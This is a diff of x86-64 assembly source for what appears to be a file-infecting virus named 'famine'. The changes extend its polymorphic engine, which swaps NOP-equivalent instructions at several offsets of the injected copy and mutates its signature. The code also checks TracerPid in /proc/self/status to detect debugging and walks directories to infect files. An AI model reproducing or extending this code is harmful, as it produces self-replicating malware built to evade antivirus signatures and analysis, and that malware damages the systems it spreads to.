@@ -12,14 +12,11 @@ sub rbp, famine_size  ; reserve famine_size bytes on the stack
 OBF_POLY_1
 
 
-
 dd 0x90909090
-
 .poly_nop_1:
+dd 0x90909090		; this line is to be replaced by random polymorphic instruction equl to 4byte nop
 dd 0x90909090
-db 0x90
-dw 0x9090
-db 0x90
+
 .check_status:		;open the /proc/self/status
 xor rdi ,rdi
 lea rdi, STACK(famine.file_path)
@@ -122,7 +119,6 @@ cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
 	jne .nextfile_proc
 
 
-
 ;compute commfile path
 .poly_xor_r10_1:
 xor r10, r10
@@ -218,10 +214,12 @@ nop
 
 .get_random:
 	OBF_PUSH_RDI
+	OBF_PUSH_R9
 	push rsi
 	OBF_PUSH_RAX
 	push rdx
 	push r11
+	OBF_PUSH_R10
 
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
@@ -239,17 +237,21 @@ nop
 	mov rax, _close
 	syscall
 
+	OBF_POP_R10
 	pop r11
 	pop rdx
 	OBF_POP_RAX
 	pop rsi
+	OBF_POP_R9
 	OBF_POP_RDI
 	ret
 	.err_ex:
+	OBF_POP_R10
 	pop r11
 	pop rdx
 	OBF_POP_RAX
 	pop rsi
+	OBF_POP_R9
 	OBF_POP_RDI
 	OBF_POP_RDI
 	OBF_POP_RDI
@@ -396,6 +398,8 @@ lea rdi, [rel infect_dir] ; load dir str
 	jl .nextdir
 	mov STACK(famine.dir_fd), rax		; save dir_fd
 
+.poly_nop_3:
+dd 0x90909090
 .readdir:
 	mov rdx, DIRENT_ARR_SIZE
 	lea rsi, STACK(famine.dirents)
@@ -630,23 +634,27 @@ inject_self:
 	add r10,JUMP_DECYPHER_OFFSET
 	mov byte[r10], 0
 
-
-
-	;setting r10 to REAL_POLY_1_OFFSET + location in mem
+	;try and build array of offset to poly_nop
 	xor r11, r11
-	lea r10, STACK(famine.tocypher)
-	add r10, POLY_NOP_1_OFFSET
+	lea r10, STACK(famine.poly_offsets)
+	mov qword[r10], POLY_NOP_1_OFFSET
+	mov qword[r10+8], POLY_NOP_2_OFFSET
+	mov qword[r10+16], POLY_NOP_3_OFFSET
+	mov word[r10+24], 0x1111
 	mov r11, POLY_NOP_NUMBER	; the number of possible polymorphic intrustions 
-	mov rax, POLY_NOP_SIZE	; the size of instruction replaced (equal to the size of replacing one)
+	mov r9, POLY_NOP_SIZE	; the size of instruction replaced (equal to the size of replacing one)
 	lea rsi, [rel poly_nop]
 	call .poly_engine
 	jmp .poly_xor1
 
 	;HERE IT REPLACE 4 BYTE NOP AT POLY_NOP_1_OFFSET WITH 4 BYTE IDENTICAL AS NOP ; 
 
-	;THE FUNCTION NEED : r10 AT THE OFFSET TO REPLACE DATA  - r11 REPRESENT NUMBER OF POSSIBLE POLY INTRSUCTIONS - rax HAS TO BE EQUAL TO THE SIZE TO REPLACE - RSI = lea rsi, [rel LOCATION OF POLY INTRUCTIONS]
+	;THE FUNCTION NEED : r10 ARRAY OF OFFSETS TO REPLACE WITH THIS POLY SET  - r11 REPRESENT NUMBER OF POSSIBLE POLY INTRSUCTIONS - r9 HAS TO BE EQUAL TO THE SIZE TO REPLACE - RSI = lea rsi, [rel LOCATION OF POLY INTRUCTIONS]
 	.poly_engine:
 	call _start.get_random
+	push rsi
+	lea rcx, STACK(famine.tocypher)
+	add rcx, qword[r10]
 	xor rdi,rdi
 	mov dil, byte STACK(famine.tmp_rand)
 	cmp rdi, r11
@@ -656,22 +664,39 @@ inject_self:
 	cmp rdi, r11
 	jge .mod
 	.moddone:
+	mov rax, r9
 	mul di
 	mov dil, al
 	add rsi, rdi
-	mov r11d, dword[rsi]
-	mov dword[r10], r11d
+	push r11
+	OBF_PUSH_R9
+	.looping:
+	mov r11b, byte[rsi]
+	mov byte[rcx], r11b
+	inc rsi
+	inc r10
+	inc rcx
+	dec r9
+	cmp r9, 0
+	jne .looping
+	OBF_POP_R9
+	pop r11
+	pop rsi
+	add r10, 0x4
+	cmp word[r10], 0x1111
+	jne .poly_engine
 	ret
-	;END OF POLY 4byte NOPS
-	.poly_xor1:
-	lea r10, STACK(famine.tocypher)
-	add r10, POLY_XOR_R10_1_OFFSET
-	mov r11, POLY_XOR_NUMBER
-	mov rax, POLY_XOR_SIZE
-	lea rsi, [rel poly_xor_r10_r10]
-	call .poly_engine
-	;setting r10 to REAL_POLY_2_OFFSET + location in mem
+	;END OF POLY ENGINE 
 
+	.poly_xor1:
+;	xor r11, r11
+;	lea r10, STACK(famine.poly_offsets)
+;	mov qword[r10], POLY_XOR_R10_1_OFFSET
+;	mov word[r10+10], 0x1111
+;	mov r11, POLY_XOR_NUMBER
+;	mov r9, POLY_XOR_SIZE
+;	lea rsi, [rel poly_xor_r10_r10]
+;	call .poly_engine
 
 
 ;	lea r10, STACK(famine.tocypher)
@@ -713,8 +738,9 @@ inject_self:
 	inc r10
 	add byte[r10], r11b
 	.done_finger:
-	mov STACK(famine.morph_sign_u), r11
-	mov STACK(famine.morph_sign_d), r12
+	mov STACK(famine.morph_sign_u), r11	;	save current signature state
+	mov STACK(famine.morph_sign_d), r12	;	save current signature state
+
 	call _start.get_random
 	lea r10,STACK(famine.tocypher)
 	add r10, POLY_OFFSET_1
@@ -853,8 +879,6 @@ poly_xor_r10_r10:	push 0
 						mov rcx, rcx
 
 					mov r10d, 0
-
-					lea eax, [rel 0]
 
 
 
